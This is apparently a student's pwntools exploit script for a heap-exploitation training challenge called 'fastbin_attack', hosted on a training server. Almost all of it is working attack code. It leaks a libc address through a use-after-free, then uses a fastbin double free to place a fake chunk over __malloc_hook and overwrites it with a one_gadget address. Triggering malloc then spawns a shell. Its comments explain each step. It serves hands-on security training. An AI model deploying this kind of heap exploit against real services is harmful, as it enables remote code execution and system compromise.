from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    # ssh = ssh("acidburn", "192.168.56.104")
    r = process("./fastbin_attack")
    gdb.attach(r, """
        brva 0x13a0
        c
        """)

    input("wait")
else:
	r = remote("bin.training.jinblack.it", 10101)


#There are two vulnerabilities: free after free and use after free

def alloc(size):
	r.recvuntil("> ")
	r.sendline("1")
	r.recvuntil("Size: ")
	r.sendline("%d" % size)
	r.recvuntil("index ")
	return int(r.recvuntil("!")[:-1]) #the square parenthesis remove the last element and the int convert it

def alloc_no_return(size):
	r.recvuntil("> ")
	r.sendline("1")
	r.recvuntil("Size: ")
	r.sendline("%d" % size)

def write_(index, data):
	r.recvuntil("> ")
	r.sendline("2")
	r.recvuntil("Index: ")
	r.sendline("%d" % index)
	r.recvuntil("Content: ")
	r.send(data)
	r.recvuntil("Done!\n")

def read_(index):
	r.recvuntil("> ")
	r.sendline("3")
	r.recvuntil("Index: ")
	r.sendline("%d" % index)
	return r.recvuntil("\nOptions:")[:-len("\nOptions:")] #pay attention to the \n otherwise it may cause problems

def free(index):
	r.recvuntil("> ")
	r.sendline("4")
	r.recvuntil("Index: ")
	r.sendline("%d" % index)
	r.recvuntil("freed!\n")

#We can do a use after free attack

i = alloc(200) #200 done to avoid usage of fastbin and pass into unsorted bin since 200 is bigger than 0xA0

write_(i,b"A"*50) #Added

i1 = alloc(10) #done to avoid consolidation(coalescing) with the free


free(i) #i not is in main arena which is a data structure in libc
#print("Index to get libc: %d" % i)

#data= u64(read_(i)+b'\x00\x00')
libc_leak = u64(read_(i).ljust(8, b'\x00')) #libc usually start with 7f so if you get a different value probably you ned to check
libc_base = libc_leak - 0x3c4b78
print("[!] libc_leak: %#x" % libc_leak)
print("[!] libc_base: %#x" % libc_base)
#WE LEAKED LIBC ADDR
malloc_hook = libc_base + 0x3c4b10
#free_hook = 0x3c67a8 + libc_base # for malloc hook use 0x3c4b10
fake_chunk = malloc_hook - 0x23 #This 0x23 is done because there are before malloc_hook some addresses that start with 7f. Since libc mem is aligned we can disalign and use that 7f as a chunk size (size for all bins from 60 to 68)
print("[!] malloc_hook: %#x" % malloc_hook)
print("[!] fake_chunk: %#x" % fake_chunk)
gadget = libc_base + 0xf1247 #offset obtained with one_gadget tool #alternative to try 0xf03a4
print("[!] gadget: %#x" % gadget)  # or print(hex(gadget))

#NOW WE START THE FASTBIN ATTACK
SIZE = 0x60 #Dimension within the fastbin window (chosen because we have malloc_hook with 7f and we 0x60 + 0x10 header (16 byte) + 1 prev_inuse = 0x71 hence 0x7f is not considered corruption
#Using a value on 0x8X or 0x6X would be considered wrong
c1 = alloc(SIZE)
c2 = alloc(SIZE) #We need another one to avoid consolidation with top chunk and controls.
#input("check")
free(c1)
free(c2) #We need this in the middle because there is a check on the head of the list and it would recognise the free on c1 again
free(c1)
#input("check after double free")
#now c1 will be allocated twice


t1 = alloc(SIZE)

alloc(SIZE)

write_(t1, p64(fake_chunk)) #p64 to write it packed (little endian as in linux)

input("wait")

alloc(SIZE)

target_index = alloc(SIZE) #Here it is where we can write

print("[!] target_index: %#x" % target_index)

input("wait")

write_(target_index, b"z"*0x13+ p64(gadget)) #0x13 is 0x23-0x10 of the header of the chunk

input("wait")

print("gadget address inserted")

alloc_no_return(SIZE)

r.interactive()

